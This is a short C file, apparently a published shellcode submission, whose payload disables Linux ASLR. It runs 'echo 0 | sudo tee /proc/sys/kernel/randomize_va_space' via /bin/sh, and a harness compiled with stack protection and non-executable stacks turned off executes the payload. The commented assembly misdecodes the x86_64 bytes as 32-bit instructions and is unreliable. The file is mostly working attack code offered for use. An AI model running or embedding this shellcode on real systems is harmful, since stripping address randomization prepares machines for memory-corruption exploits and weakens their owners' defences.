/*
	ASLR (Address Space Layout Randomization) Disable Shellcode Language C & ASM - Linux/x86_64

	Author : Kağan Çapar
	contact: kagancapar@gmail.com
	shellcode len : 93 bytes
	compilation: gcc -fno-stack-protector -z execstack [.c] -o []

	Test:
	run shellcode (./aslr etc.)
	check : cat /proc/sys/kernel/randomize_va_space
	you will see "0"

	Assembly:

	global _start
	section .ASLR
	_start:

	#6A3B              push byte +0x3b
	#58                pop eax
	#99                cdq
	#48                dec eax
	#BB2F62696E        mov ebx,0x6e69622f
	#2F                das
	#7368              jnc 0x75
	#005348            add [ebx+0x48],dl
	#89E7              mov edi,esp
	#682D630000        push dword 0x632d
	#48                dec eax
	#89E6              mov esi,esp
	#52                push edx
	#E836000000        call 0x56
	#6563686F          arpl [gs:eax+0x6f],bp
	#2030              and [eax],dh
	#207C2073          and [eax+0x73],bh
	#7564              jnz 0x90
	#6F                outsd
	#20746565          and [ebp+0x65],dh
	#202F              and [edi],ch
	#7072              jo 0xa7
	#6F                outsd
	#632F              arpl [edi],bp
	#7379              jnc 0xb3
	#732F              jnc 0x6b
	#6B65726E          imul esp,[ebp+0x72],byte +0x6e
	#656C              gs insb
	#2F                das
	#7261              jc 0xa6
	#6E                outsb
	#646F              fs outsd
	#6D                insd
	#697A655F76615F    imul edi,[edx+0x65],dword 0x5f61765f
	#7370              jnc 0xc2
	#61                popa
	#636500            arpl [ebp+0x0],sp
	#56                push esi
	#57                push edi
	#48                dec eax
	#89E6              mov esi,esp
	#0F05              syscall

*/

#include <stdio.h>
#include <string.h>

unsigned char ASLR[] = \
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x36\x00"
"\x00\x00\x65\x63\x68\x6f\x20\x30\x20\x7c\x20\x73\x75\x64\x6f"
"\x20\x74\x65\x65\x20\x2f\x70\x72\x6f\x63\x2f\x73\x79\x73\x2f"
"\x6b\x65\x72\x6e\x65\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x7a"
"\x65\x5f\x76\x61\x5f\x73\x70\x61\x63\x65\x00\x56\x57\x48\x89"
"\xe6\x0f\x05";

int main()
{
	printf("Shellcode len: %d\n", strlen(ASLR));

	int (*ret)() = (int(*)())ASLR;

	ret();

}